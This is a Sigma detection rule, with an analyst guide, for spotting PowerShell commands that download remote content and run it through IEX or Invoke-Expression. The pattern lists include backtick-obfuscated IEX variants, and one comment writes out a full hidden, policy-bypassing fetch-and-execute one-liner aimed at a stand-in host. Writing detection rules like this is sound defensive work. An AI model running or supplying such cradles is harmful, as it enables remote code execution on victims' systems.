title: PowerShell Download and Execution Cradles
id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
status: test
description: Detects PowerShell download and execution cradles.
references:
- https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd
- https://labs.withsecure.com/publications/fin7-target-veeam-servers
author: Florian Roth (Nextron Systems)
date: 2022-03-24
modified: 2025-07-18
tags:
- attack.execution
- attack.t1059
logsource:
  product: windows
  category: process_creation
detection:
  selection_download:
    CommandLine|contains:
    - '.DownloadString('
    - '.DownloadFile('
    - 'Invoke-WebRequest '
    - 'iwr '
    - 'Invoke-RestMethod '
    - 'irm '          # powershell -ep bypass -w h -c irm test.domain/ffe | iex
  selection_iex:
    CommandLine|contains:
    - ';iex $'
    - '| IEX'
    - '|IEX '
    - 'I`E`X'
    - 'I`EX'
    - 'IE`X'
    - 'iex '
    - 'IEX ('
    - 'IEX('
    - 'Invoke-Expression'
  condition: all of selection_*
falsepositives:
- Some PowerShell installers were seen using similar combinations. Apply filters
  accordingly
level: high
regression_tests_path: 
  regression_data/rules/windows/process_creation/proc_creation_win_powershell_download_iex/info.yml
note: |
  ### Technical Context

  This Sigma rule detects the execution of PowerShell commands that involve downloading and executing scripts or executables from remote locations. The likely objective of an attacker employing this method is to execute malicious code or payloads on the victim's system, often as part of a broader attack strategy to establish persistence or exfiltrate data. Relevant MITRE ATT&CK tactics and techniques include Execution (T1203) and Command and Scripting Interpreter (T1059). The primary telemetry sources for this detection are Windows process creation logs, specifically focusing on CommandLine parameters. If malicious, this behavior can lead to system compromise, data breaches, or lateral movement within the network. However, note that the presence of these command patterns does NOT definitively prove malicious intent on its own; further investigation is required to confirm an active threat.

  ### Investigation Steps

  - **Review the CommandLine parameters**: Check for process creation events (Windows Security Event ID 4688 or Sysmon Event ID 1) containing 'DownloadString(', 'DownloadFile(', or typical PowerShell invocations (e.g., 'Invoke-WebRequest'). Any instance of these patterns warrants closer scrutiny.

  - **Identify high-confidence malicious indicators**: Look for command patterns that include both remote script downloading (e.g., 'Invoke-WebRequest') and immediate execution (e.g., via 'IEX' or 'Invoke-Expression'). This combination typically indicates a high likelihood of malicious behavior.

  - **Assess legitimate PowerShell usage**: Compare the detected commands against known good operational practices. For example, legitimate installations or updates using 'Invoke-WebRequest' might include additional parameters that specify valid URLs or source paths, significantly differing from suspicious command structures.

  - **Check for unusual parent processes**: Investigate the parent process of the detected PowerShell instances; legitimate processes (like 'powershell.exe' being invoked by 'msiexec.exe') may indicate acceptable administrative tasks, while instances launched from unusual executables may signal a compromise.

  - **Validate log data collection configurations**: Ensure that process creation logs are being captured with the appropriate level of detail and duration for historical analysis. Confirm that Sysmon is properly configured for robust visibility into PowerShell activities.

  - **Correlate with existing threat intelligence**: Look for matching indicators within threat intelligence feeds or reported TTPs related to known threat actors utilizing PowerShell download cradles. This can help in understanding the broader context of the alert.

  ### Prioritization

  This alert carries a high severity level due to the potential impact on sensitive systems and data. PowerShell is frequently abused for malicious purposes, making detection of these specific patterns critical. Additionally, this type of execution pattern is commonly weaponized, increasing the urgency of response.

  ### Blind Spots and Assumptions

  There are potential evasion techniques associated with variations in PowerShell command syntax that could bypass this detection, such as obfuscation or using less common parameters. Reliable detection requires that logs from all necessary Windows components, specifically process creation events, be enabled and correctly configured. Legitimate administrative tasks may occasionally trigger this alert, reflecting the need for contextual awareness. A related detection to bolster coverage would involve monitoring for lateral movement techniques such as remote WMI calls (T1047), which often accompany malicious PowerShell usage.

